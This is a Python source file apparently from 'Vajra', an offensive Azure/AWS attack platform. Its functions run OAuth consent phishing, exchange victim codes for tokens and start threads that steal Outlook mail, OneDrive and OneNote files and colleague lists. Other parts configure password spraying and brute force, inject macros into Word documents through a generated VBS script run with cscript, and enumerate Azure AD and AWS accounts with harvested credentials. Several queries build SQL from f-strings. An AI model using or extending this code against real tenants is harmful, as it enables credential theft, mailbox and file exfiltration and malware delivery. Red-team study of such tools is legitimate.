# Copyright (C) 2022 Raunak Parmar, @trouble1_raunak
# All rights reserved to Raunak Parmar

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.

# This tool is meant for educational purposes only. 
# The creator takes no responsibility of any mis-use of this tool.

from sqlalchemy.sql.expression import false, true
from flask_login import current_user
from vajra import db, bcrypt, sqlite_used, DB_PATH, POSTGRES
from vajra.models import *
from sqlalchemy.sql import text
from vajra.azure.attacks.phishing import stealerAction, stealing
from vajra.azure.enumeration.azureAd import azureAdEnum
from vajra.azure.enumeration.azureAzService import  azureAzServiceEnum
from vajra.aws.enumeration.enumerate import startEnumerate
from vajra.aws.enumeration.function import get_client
from vajra.aws.enumeration.s3Scanner import s3ScannerEnum
import pandas as pd
import sqlite3 as sqlite
import psycopg2 as pg
import sys, os, threading, base64, json, jwt
from vajra.aws.enumeration.config_review  import startconfigReview

directory = os.path.dirname(os.path.realpath(__file__)) + "/tmp/"

class thread_with_trace(threading.Thread):
  def __init__(self, *args, **keywords):
    threading.Thread.__init__(self, *args, **keywords)
    self.killed = False
 
  def start(self):
    self.__run_backup = self.run
    self.run = self.__run     
    threading.Thread.start(self)
 
  def __run(self):
    sys.settrace(self.globaltrace)
    self.__run_backup()
    self.run = self.__run_backup
 
  def globaltrace(self, frame, event, arg):
    if event == 'call':
      return self.localtrace
    else:
      return None
 
  def localtrace(self, frame, event, arg):
    if self.killed:
      if event == 'line':
        raise SystemExit()
    return self.localtrace
 
  def kill(self):
    self.killed = True

def firstVisitDb(uuid):

    db.session.add_all([
        StealerConfig(uuid=uuid),
        sprayingConfig(uuid=uuid),
        bruteforceConfig(uuid=uuid),
        azureStorageAccountConfig(uuid=uuid),
        specificAttackStatus(uuid=uuid),
        AttackStatus(uuid=uuid, phishing="False", spraying="False", bruteforce="False"),
        enumerationStatus(uuid=uuid, userenum="False", subdomain="False", azureAdEnum="False")
        ]
    )
    db.session.commit()


def getPhishUrl(uuid):
    return stealing.getPhishLink(uuid)


def getAttackStatus(attackName):
    try:
        if attackName == "spraying":
            return AttackStatus.query.filter_by(uuid=current_user.id).first().spraying
        elif attackName == "phishing":       
            return AttackStatus.query.filter_by(uuid=current_user.id).first().phishing
        elif attackName == "bruteforce":       
            return AttackStatus.query.filter_by(uuid=current_user.id).first().bruteforce
    except Exception as e:
        return "False"

def insertsubdomainlist(form):
    enumerationdata.query.filter_by(uuid=current_user.id).delete()
    db.session.commit()
    for word in (form.dnsList.data).splitlines():
        wordlist = enumerationdata(uuid=current_user.id, subdomainWordlist = word)
        db.session.add(wordlist)
    db.session.commit()

def getEnumerationStatus(enumName):
    try:
        if enumName == "userenum":
            return enumerationStatus.query.filter_by(uuid=current_user.id).first().userenum
        if enumName == "subdomain":
            return enumerationStatus.query.filter_by(uuid=current_user.id).first().subdomain
            
    except Exception as e:
        return "False"    


class stolenData():
    def getOnedrive():
        return OneDrive.query.filter_by(uuid=current_user.id).count()

    def getOneDriveFiles():
        return OneDrive.query.with_entities(OneDrive.filename).filter_by(uuid= current_user.id).order_by(OneDrive.filename.desc()).limit(2).all()

    def getOutlook():
        return Outlook.query.filter_by(uuid=current_user.id).count()

    def getOutlookSubject():
        return Outlook.query.with_entities(Outlook.Subject).filter_by(uuid= current_user.id).order_by(Outlook.Subject.desc()).limit(2).all()

    def getAttachments():
        return Attachments.query.filter_by(uuid=current_user.id).count()

    def getOneNote():
        return OneNote.query.filter_by(uuid=current_user.id).count()   

    def getOneNoteFiles():
        return OneNote.query.with_entities(OneNote.filename).filter_by(uuid= current_user.id).limit(2).all()

    def getAllusers():
        return Allusers.query.with_entities(Allusers.userPrincipalName).filter_by(uuid= current_user.id).count()

    def getAllvictims():
        return Allusers.query.filter_by(uuid= current_user.id).limit(2).all()

    def getTotalvictims():
        return Allusers.query.filter_by(uuid= current_user.id).count()

    def getVisitors():
        return Visitors.query.with_entities(Visitors.ip, Visitors.uuid).filter_by(uuid=current_user.id).distinct().count()

    def getAzAPIcount():
        return Admin.query.filter_by(id=current_user.id).first().azureUsage

def enumeratedData(victim):
    class get():
        azureAdGroupData = azureAdEnumeratedGroups.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
        azureAdUsersData = azureAdEnumeratedUsers.query.filter_by(uuid=current_user.id, victim=victim).order_by(azureAdEnumeratedUsers.roles.desc(), azureAdEnumeratedUsers.usersGroups.desc()).limit(1000).all()
        azureAdDeviceData = azureAdEnumeratedDevices.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
        azureAdAdminusers = azureAdEnumeratedAdmins.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
        azureAdCustomDirectoryRoles = azureAdEnumeratedCustomDirectoryRoles.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
        azureAdApplications = azureAdEnumeratedApplications.query.filter_by(uuid=current_user.id, victim=victim).order_by(azureAdEnumeratedApplications.appRoles.desc()).limit(1000).all()
        azureAdServicePrinciple = azureAdEnumeratedServicePrinciple.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
        azureAdConditionalAccessPolicy = azureAdEnumeratedConditionalAccessPolicy.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
        azureAdUserProfile = azureAdEnumeratedUserProfile.query.filter_by(uuid=current_user.id, victim=victim).first()

    return(get)

def insertAdminConfig(form):
    admin = Admin.query.filter_by(id=current_user.id).first()
    admin.username = form.username.data
    admin.enableIp = form.enableIp.data
    admin.ips = form.ips.data
    admin.theme = form.theme.data
    if form.new_password.data:
        admin.password = bcrypt.generate_password_hash(form.new_password.data).decode('utf-8')

    db.session.commit()


def insertStealerConfig(form, macros):
    StealerConfig.query.filter_by(uuid = current_user.id).delete()
    db.session.commit()
    stealAll, victimsColleague, oneDrive, oneNote, outlook, noStealing, macroInjection = "", "","","","","", ""
    if form.stealAll.data:
        stealAll = "checked"
    if form.victimsColleague.data:
        victimsColleague = "checked"
    if form.oneDrive.data:
        oneDrive = "checked"
    if form.oneNote.data:
        oneNote = "checked"
    if form.outlook.data:
        outlook = "checked"
    if form.noStealing.data:
        noStealing = "checked"
    if form.macroInjection.data:
        macroInjection = "checked"

    clientID = form.clientId.data
    clientSecret = form.clientSecret.data
    redirectUrl = form.redirectUrl.data
    redirectNext = form.redirectUrlNext.data
    extension = form.extension.data
    delay = form.delay.data
    phishUrl = stealing.createPhishLink(clientID, redirectUrl)

    insetConfig = StealerConfig(uuid=current_user.id,
                                client_id=clientID, 
                                client_secret=clientSecret,
                                redirect_url=redirectUrl,
                                redirect_after_stealing=redirectNext,
                                macros=macros,
                                extension=extension, 
                                delay=delay,
                                phishUrl=phishUrl,
                                stealAll=stealAll,
                                victimsColleague=victimsColleague,
                                oneDrive=oneDrive,
                                oneNote=oneNote,
                                outlook=outlook,
                                noStealing=noStealing,
                                macroInjection=macroInjection,
                                )

    db.session.add(insetConfig)
    db.session.commit()

def insertSprayingConfig(form, file):
    if file != b'':
        victimslist = file.decode("utf-8")
        db.session.query(AddedVictims).filter_by(uuid = current_user.id).delete()
        for email in victimslist.splitlines():
            try:
                db.session.add(AddedVictims(uuid=current_user.id, userPrincipalName=email))
            except:
                pass    


    password, customVictims, advanceSpray = "", "", ""
    if form.password.data:
        password = form.password.data

    if form.customVictims.data:
        customVictims = "checked"

    if form.advanceSpray.data:
        advanceSpray = "checked"        
    

    db.session.query(sprayingConfig).filter_by(uuid = current_user.id).delete()
    db.session.add(sprayingConfig(uuid=current_user.id, customVictims=customVictims,advanceSpray=advanceSpray, password=password))
    db.session.commit()


def insertUserEnum(list, file):
    emails = list +"\r\n" + file.decode("utf-8")
    ForUserEnum.query.filter_by(uuid = current_user.id).delete()
    db.session.commit()
    for email in emails.splitlines():
        try:            
            db.session.add(ForUserEnum(uuid=current_user.id, emails=email))
        except Exception as e:
            print(e)

    db.session.commit()    
 

def insertBruteforceConfig(form):
    userList, passList = "", ""
    userList = form.usernameList.data
    passList = form.passwordList.data
    bruteforceConfig.query.filter_by(uuid = current_user.id).delete()
    db.session.commit()
    db.session.rollback()
    if form.usernameListFile.data:
        userList = userList + "\r\n" +form.usernameListFile.data.read().decode("utf-8")

    for username in userList.splitlines():
        try:

            db.session.add(bruteforceConfig(uuid=current_user.id, usernames=username))
            db.session.commit()
            db.session.rollback()

        except Exception as e:
            print(e)
            pass

    if form.passwordListFile.data:
        passList = passList + "\r\n" + form.passwordListFile.data.read().decode("utf-8")
    
    for password in passList.splitlines():
        try:
            
            db.session.add(bruteforceConfig(uuid=current_user.id, passwords=password))
            db.session.commit()
            db.session.rollback()
        except:
            pass
    


def getTokenFromCode(uuid, code):
    
    class getStealConfig():
        config = StealerConfig.query.filter_by(uuid=uuid).first()
        CLIENTID = config.client_id
        CLIENTSECRET =  config.client_secret
        REDIRECTURL = config.redirect_url

    tokenResponse = stealing.getTokens(code, getStealConfig) # use code to get access and refresh tokens
    stealing.insertToken(uuid, tokenResponse, getStealConfig)      # insert refresh token and others in tokens table
    username = tokenResponse['userId']
    return username

def deleteVictimData(username):
    Outlook.query.filter_by(username = username).delete()
    OneDrive.query.filter_by(username = username).delete()
    OneNote.query.filter_by(username = username).delete()
    Token.query.filter_by(username = username).delete()
    db.session.commit()
    
def getDefaultPhishingConfig(uuid):
    class default():
        config = StealerConfig.query.filter_by(uuid=uuid).first()
        clientId = config.client_id
        clientSecret = config.client_secret
        redirectUrl = config.redirect_url
        redirectUrlNext = config.redirect_after_stealing
        macros = config.macros
        extension = config.extension
        delay = config.delay
        if delay == "":
            delay = 0
        stealAll = config.stealAll
        victimsColleague = config.victimsColleague
        oneDrive = config.oneDrive
        oneNote = config.oneNote
        outlook = config.outlook
        noStealing = config.noStealing
        macroInjection = config.macroInjection

    return(default)    

def startStealing(uuid, username):
    log = (f'<br><span style="color:yellow">[+] {username} incoming!</span>')
    db.session.add(phishingLogs(uuid=uuid, message=log))
    db.session.commit()
    accessToken = stealerAction.getAccessToken(uuid, username)
    config = StealerConfig.query.filter_by(uuid=uuid).first()
    
    if config.noStealing != "checked" or config.stealAll == "checked":
        if config.victimsColleague == "checked" or config.stealAll == "checked":
            threading.Thread(target=stealing.listusers, args=(uuid, accessToken, username)).start()

        if config.outlook == "checked" or config.stealAll == "checked":            
            threading.Thread(target=stealing.outlook, args=(uuid, accessToken, username, "/me/mailfolders/inbox/messages?$top=300")).start()

        if config.oneDrive == "checked" or config.stealAll == "checked":
            threading.Thread(target=stealing.oneDrive, args=(uuid, accessToken, username, getDefaultPhishingConfig(uuid))).start()

        if config.oneNote == "checked" or config.stealAll == "checked":
            threading.Thread(target=stealing.oneNote, args=(uuid, accessToken, username, getDefaultPhishingConfig(uuid))).start()

def stealDuringPhish(uuid, code):
    try:
        username = getTokenFromCode(uuid, code)
        startStealing(uuid, username)
    except Exception as e:
        print(e)
        pass

def reStealingVictim(uuid, username):
    startStealing(uuid, username)


def getNewToken(username):
    accessToken = stealerAction.getAccessToken(current_user.id, username)
    return accessToken
    
def replaceOneDriveFile(uuid, username, id, name, content):
    return stealerAction.replaceOneDriveFile(uuid, username, id, name, content)

def deleteOneDriveFile(uuid, username, id):
    return stealerAction.deleteOneDriveFile(uuid, username, id)

def downloadfile(file, b64):
    try:
        os.stat(directory)
    except:
        os.mkdir(directory)

    data = file[0][0]
    path = directory + file[0][1]
    if b64 == true:
        data     = base64.b64decode(data)
        with open(path, "wb") as binary_file:
            binary_file.write(data)      
    else:
        f = open(path, "w")
        f.write(data)
        f.close()
    
    return path

def startAzureAdEnumeration(form):
    username = form.username.data
    password = form.password.data
    clientId = form.clientId.data
    accessToken = form.accessToken.data
    
    if username != "" and password != "":
        res = azureAdEnum.enumCred(current_user.id, username, password, clientId)
        return res

    elif accessToken != "":
        try:
            username = jwt.decode(accessToken, options={"verify_signature": False, "verify_aud": False})["upn"]
        except:
            return "error", "Invaild Token Found!"
        res = azureAdEnum.enumToken(current_user.id, accessToken, username)
        return res

    return "warning", "Invalid Credentials or Access Token not found!"

def startAzServiceEnumeration(form):
    username = form.username.data
    password = form.password.data
    accessToken = form.accessToken.data
    clientId = form.clientId.data

    if username != "" and password != "":
        res = azureAzServiceEnum.enumCred(current_user.id, username, password, clientId)
        return res

    elif accessToken != "":
        try:
            username = jwt.decode(accessToken, options={"verify_signature": False})["upn"]
        except:
            return "error", "Invaild Token Found!"    
        
        res = azureAzServiceEnum.enumToken(current_user.id, accessToken, username)
        return res
        
    return "warning", "Invalid Credentials or Access Token not found!"

def getPath(type, id):

    if type == "attachment":
        Attachments = db.engine.execute(text("Select data, filename victim from Attachments where id = :id and uuid= :uuid"),uuid=current_user.id, id=id).fetchall()
        return downloadfile(Attachments, true)

    if type == "oneDrive":
        oneDrive = db.engine.execute(text("Select data, filename username from one_drive where id = :id and uuid= :uuid"),uuid=current_user.id, id=id).fetchall()
        return downloadfile(oneDrive, true)

    if type == "oneNote":
        oneNote = db.engine.execute(text("Select data, filename username from one_note where id = :id and uuid= :uuid"),uuid=current_user.id, id=id).fetchall()
        return downloadfile(oneNote, false)

def downloadBruteforce(type):
    if sqlite_used == True:
        engine = sqlite.connect(DB_PATH)
    else:
        engine = pg.connect(POSTGRES)

    if type == "config":
        path = directory + "bruteforce_configuration.xlsx"
        sh = pd.read_sql_query(f"select * from bruteforce_config where uuid = '{current_user.id}'", con=engine)
        with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
            sh.to_excel(writer, sheet_name='Bruteforce Config', index=False)

        return path

    if type == "results":
        path = directory + "bruteforce_results.xlsx"
        sh = pd.read_sql_query(f"select * from bruteforce_result where uuid = '{current_user.id}'", con=engine)
        with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
            sh.to_excel(writer, sheet_name='Bruteforce Results', index=False)
        
        return path        

def downloadSpraying(type):
    if sqlite_used == True:
        engine = sqlite.connect(DB_PATH)
    else:
        engine = pg.connect(POSTGRES)

    if type == "addedemails":
        path = directory + "spraying_configuration.xlsx"
        sh = pd.read_sql_query(f"select * from added_victims where uuid = '{current_user.id}'", con=engine)
        with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
            sh.to_excel(writer, sheet_name='Added Victims', index=False)

        return path
    
    if type == "results":
        path = directory + "spraying_results.xlsx"
        sh = pd.read_sql_query(f"select * from spraying_result where uuid = '{current_user.id}'", con=engine)
        with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
            sh.to_excel(writer, sheet_name='Spraying Result', index=False)

        return path    
    
def downloadUserenum():
    if sqlite_used == True:
        engine = sqlite.connect(DB_PATH)
    else:
        engine = pg.connect(POSTGRES)
    path = directory + "valid_emails.xlsx"

    sh = pd.read_sql_query(f"select * from valid_emails where uuid = '{current_user.id}'", con=engine)
    with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
        sh.to_excel(writer, sheet_name='Valid Mails', index=False)
    
    return path

def downloadSubdomainEnum():
    if sqlite_used == True:
        engine = sqlite.connect(DB_PATH)
    else:
        engine = pg.connect(POSTGRES)
    path = directory + "valid_subdomains.xlsx"
    
    sh = pd.read_sql_query(f"SELECT * FROM enumeration_results where uuid = '{current_user.id}'", con=engine)
    with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
        sh.to_excel(writer, sheet_name='Valid Subdomains', index=False)
    
    return path
 
def victimsDownload(type):
    if sqlite_used == True:
        engine = sqlite.connect(DB_PATH)
    else:
        engine = pg.connect(POSTGRES)

    if type == "more":
        path = directory + "more_victims.xlsx"
        sh = pd.read_sql_query(f"select * from allusers where uuid = '{current_user.id}'", con=engine)
        with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
            sh.to_excel(writer, sheet_name='All users', index=False)
        return path

    elif type == "phished":
        path = directory + "phished_victims.xlsx"
        sh = pd.read_sql_query(f"select * from token where uuid = '{current_user.id}'", con=engine)
        with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
            sh.to_excel(writer, sheet_name='Phished Users', index=False)

        return path

def downloadEnumeratedData(victim):
    if sqlite_used == True:
        engine = sqlite.connect(DB_PATH)
    else:
        engine = pg.connect(POSTGRES)

    path = directory + "Azure_AD_Enumerated_data.xlsx"
    
    sh1 = pd.read_sql_query(f"select * from azure_ad_enumerated_user_profile where uuid = '{current_user.id}' and victim = {victim}", con=engine)
    sh2 = pd.read_sql_query(f"select * from azure_ad_enumerated_users where uuid = '{current_user.id}' and victim = {victim}", con=engine)
    sh3 = pd.read_sql_query(f"select * from azure_ad_enumerated_groups where uuid = '{current_user.id}' and victim = {victim}", con=engine)
    sh4 = pd.read_sql_query(f"select * from azure_ad_enumerated_group_members where uuid = '{current_user.id}' and victim = {victim}", con=engine)
    sh5 = pd.read_sql_query(f"select * from azure_ad_enumerated_devices where uuid = '{current_user.id}' and victim = {victim}", con=engine)
    sh6 = pd.read_sql_query(f"select * from azure_ad_enumerated_admins where uuid = '{current_user.id}' and victim = {victim}", con=engine)
    sh7 = pd.read_sql_query(f"select * from azure_ad_enumerated_custom_directory_roles where uuid = '{current_user.id}' and victim = {victim}", con=engine)
    sh8 = pd.read_sql_query(f"select * from azure_ad_enumerated_applications where uuid = '{current_user.id}' and victim = {victim}", con=engine)
    sh9 = pd.read_sql_query(f"select * from azure_ad_enumerated_service_principle where uuid = '{current_user.id}' and victim = {victim}", con=engine)
    sh10 = pd.read_sql_query(f"select * from azure_ad_enumerated_conditional_access_policy where uuid = '{current_user.id}' and victim = {victim}", con=engine)
    
    with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
        sh1.to_excel(writer, sheet_name='Profile', index=False)
        sh2.to_excel(writer, sheet_name='Users', index=False)
        sh3.to_excel(writer, sheet_name='Groups', index=False)
        sh4.to_excel(writer, sheet_name='Group Members', index=False)
        sh5.to_excel(writer, sheet_name='Devices', index=False)
        sh6.to_excel(writer, sheet_name='Admin Users', index=False)
        sh7.to_excel(writer, sheet_name='Custom Directory Roles', index=False)
        sh8.to_excel(writer, sheet_name='App Registrations', index=False)
        sh9.to_excel(writer, sheet_name='Service Principles', index=False)
        sh10.to_excel(writer, sheet_name='Conditional Access Policy', index=False)
        
    return path
    


def createmacrosDoc(name, path):
    macros = StealerConfig.query.filter_by(uuid=current_user.id).first().macros
    macrosPath = path + "\\macros.txt"
    open(macrosPath, 'wb').write(macros)
    vbs = '''
            Dim wdApp
            Set wdApp = CreateObject("Word.Application")
            Set wdDoc = wdApp.Documents.Open("[docxfile]")
            Set xlmodule = wdDoc.VBProject.VBComponents.Add( 1 )
            xlmodule.CodeModule.AddFromFile "[macros]"
            wdDoc.SaveAs "[output]", 0
            wdDoc.Save
            wdDoc.Close
            wdApp.Quit
        '''

    output = name.replace(".docx", ".doc")
    vbs = vbs.replace("[docxfile]", path + name)
    vbs = vbs.replace("[macros]", macrosPath)
    vbs = vbs.replace("[output]", path + output)
    
    tmpFile = path + "\\temp.vbs"
    f = open(tmpFile, "w")
    f.write(vbs)
    f.close()
    os.popen("cscript " + tmpFile)
        
    try:
        content = open(path + name, "r", errors='ignore').read()
    except Exception as e:
        print(e)
        return false

    return content
           

def insert_storage_accounts_config(form):
    config = azureStorageAccountConfig.query.filter_by(uuid=current_user.id).first()
    config.commonWord = form.commonWord.data
    config.permutations = form.permutations.data

    db.session.commit()

def downloadspecificStorageResults():

    if sqlite_used == True:
        engine = sqlite.connect(DB_PATH)
    else:
        engine = pg.connect(POSTGRES)

    path = directory + "Public_Storage_Account_Files.xlsx"
    
    sh1 = pd.read_sql_query(f"select valid from specific_attack_storage_results where uuid = '{current_user.id}' ", con=engine)
    
    with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
        sh1.to_excel(writer, sheet_name='Profile', index=False)

    return path



##########################################------------AWS-------------------####################################################


def startAWSEnumeration(uuid, form):
    key = form.key.data
    secret = form.secret.data
    session = form.session.data
    jsonBody = form.json.data

    try:
        if jsonBody != "":
            metadata = json.loads(jsonBody)["Credentials"]
            key = metadata["AccessKeyId"]
            secret = metadata["SecretAccessKey"]
            session = metadata["SessionToken"]
    except:
        return "error", "Invalid Json"
    client = get_client(key, secret, session, 'sts', None)
    # Delete previous data
    try:
        Victim_user = client.get_caller_identity()
        victim = Victim_user["Arn"]
        userId = Victim_user["UserId"]
        awsIAMVictims.query.filter_by(uuid=uuid, victim=victim).delete()
        awsIAMUsers.query.filter_by(uuid=uuid, victim=victim).delete()
        awsIAMGroups.query.filter_by(uuid=uuid, victim=victim).delete()
        awsEc2.query.filter_by(uuid=uuid, victim=victim).delete()
        awsIAMRolePolicies.query.filter_by(uuid=uuid, victim=victim).delete()
        awsCognitoUserPool.query.filter_by(uuid=uuid, victim=victim).delete()
        awsS3.query.filter_by(uuid=uuid, victim=victim).delete()
        awsIAMPolicies.query.filter_by(uuid=uuid, victim=victim).delete()
        awsLambda.query.filter_by(uuid=uuid, victim=victim).delete()
        awsEC2SS.query.filter_by(uuid=uuid, victim=victim).delete()
        awsSecurityGroups.query.filter_by(uuid=uuid, victim=victim).delete()
        awsVPCs.query.filter_by(uuid=uuid, victim=victim).delete()
        awsRoute53.query.filter_by(uuid=uuid, victim=victim).delete()
        awsECR.query.filter_by(uuid=uuid, victim=victim).delete()
        awsEKS.query.filter_by(uuid=uuid, victim=victim).delete()
        awsECS.query.filter_by(uuid=uuid, victim=victim).delete()
        awsCloudFront.query.filter_by(uuid=uuid, victim=victim).delete()
        awsStorageGateway.query.filter_by(uuid=uuid, victim=victim).delete()
        awsEFS.query.filter_by(uuid=uuid, victim=victim).delete()
    except Exception as e:
        print(e)
        return "error", "Invalid Credentials"
    
    iamVictim = awsIAMVictims(uuid=uuid, victim=victim, userId=userId, key=key, secret=secret, session=session, enumStatus="progress")
    db.session.add(iamVictim)
    db.session.commit()
        
    threading.Thread(target=startEnumerate, args=(uuid, key, secret, session)).start()

    return "success", "Enumeration started in background!"


def startAWSConfigReview(uuid, form):

    access_key = form.key.data
    secret_key = form.secret.data
    session_token = form.session.data
    
    client = get_client(access_key, secret_key, session_token, 'sts', None)
    # Delete previous data
    try:
        Victim_user = client.get_caller_identity()
        victim = Victim_user["Arn"]
        userId = Victim_user["UserId"]
        aws_config.query.filter_by(uuid=uuid, victim=victim).delete()
        awsConfigVictims.query.filter_by(uuid=uuid, victim=victim).delete()
        db.session.commit()
    except Exception as e:
        return "error", "Invalid Credentials"
    
    ConfigVictim = awsConfigVictims(uuid=uuid, victim=victim, userId=userId, key=access_key, secret=secret_key, session=session_token, configStatus="progress")
    db.session.add(ConfigVictim)

    db.session.commit()
    threading.Thread(target=startconfigReview, args=(uuid, victim, access_key, secret_key, session_token)).start()

    return "success", "Misconguration Review Started!"

def downloadAWSconfigAssessmentResults(uuid, victim):
    if sqlite_used == True:
        engine = sqlite.connect(DB_PATH)
    else:
        engine = pg.connect(POSTGRES)

    path = os.path.join(directory , "AWS_Config_Assessment.xlsx")
    sh = pd.read_sql_query(f"select checkNo, checkTitle, status, result, arn from aws_config where uuid = '{uuid}' and victim = '{victim}' order by 1", con=engine)
    with pd.ExcelWriter(path, engine_kwargs={'options': {'strings_to_urls': False}}) as writer:  
            sh.to_excel(writer, sheet_name='Phished Users', index=False)

    return path


def deleteAwsEnumeratediamVictim(uuid, victimId):
    victim = awsIAMVictims.query.filter_by(uuid=uuid, userId=victimId).first().victim
    awsIAMVictims.query.filter_by(uuid=uuid, victim=victim).delete()
    awsIAMUsers.query.filter_by(uuid=uuid, victim=victim).delete()
    awsIAMGroups.query.filter_by(uuid=uuid, victim=victim).delete()
    awsEc2.query.filter_by(uuid=uuid, victim=victim).delete()
    awsIAMRolePolicies.query.filter_by(uuid=uuid, victim=victim).delete()
    awsCognitoUserPool.query.filter_by(uuid=uuid, victim=victim).delete()
    awsS3.query.filter_by(uuid=uuid, victim=victim).delete()
    awsIAMPolicies.query.filter_by(uuid=uuid, victim=victim).delete()
    awsLambda.query.filter_by(uuid=uuid, victim=victim).delete()
    awsEC2SS.query.filter_by(uuid=uuid, victim=victim).delete()
    awsSecurityGroups.query.filter_by(uuid=uuid, victim=victim).delete()
    awsVPCs.query.filter_by(uuid=uuid, victim=victim).delete()
    awsRoute53.query.filter_by(uuid=uuid, victim=victim).delete()
    awsECR.query.filter_by(uuid=uuid, victim=victim).delete()
    awsEKS.query.filter_by(uuid=uuid, victim=victim).delete()
    awsECS.query.filter_by(uuid=uuid, victim=victim).delete()
    awsCloudFront.query.filter_by(uuid=uuid, victim=victim).delete()
    awsStorageGateway.query.filter_by(uuid=uuid, victim=victim).delete()
    awsEFS.query.filter_by(uuid=uuid, victim=victim).delete()
    db.session.commit()


def awsiamenumeratedDeleteAll(uuid):
    awsIAMVictims.query.filter_by(uuid=uuid).delete()
    awsIAMUsers.query.filter_by(uuid=uuid).delete()
    awsIAMGroups.query.filter_by(uuid=uuid).delete()
    awsEc2.query.filter_by(uuid=uuid).delete()
    awsIAMRolePolicies.query.filter_by(uuid=uuid).delete()
    awsCognitoUserPool.query.filter_by(uuid=uuid).delete()
    awsS3.query.filter_by(uuid=uuid).delete()
    awsIAMPolicies.query.filter_by(uuid=uuid).delete()
    awsLambda.query.filter_by(uuid=uuid).delete()
    awsEC2SS.query.filter_by(uuid=uuid).delete()
    awsSecurityGroups.query.filter_by(uuid=uuid).delete()
    awsVPCs.query.filter_by(uuid=uuid).delete()
    awsRoute53.query.filter_by(uuid=uuid).delete()
    awsECR.query.filter_by(uuid=uuid).delete()
    awsEKS.query.filter_by(uuid=uuid).delete()
    awsECS.query.filter_by(uuid=uuid).delete()
    awsCloudFront.query.filter_by(uuid=uuid).delete()
    awsStorageGateway.query.filter_by(uuid=uuid).delete()
    awsEFS.query.filter_by(uuid=uuid).delete()
    db.session.commit()



def runS3Scanner(form, file):

    awsS3Scanner.query.filter_by(uuid=current_user.id, name=form.commonWord.data).delete()
    db.session.commit()
    db.session.add(awsS3Scanner(uuid=current_user.id, name=form.commonWord.data, permutations=file.decode("utf-8"), progress="progress"))
    db.session.commit()
    
    s3ScannerEnum.start(current_user.id, form.commonWord.data)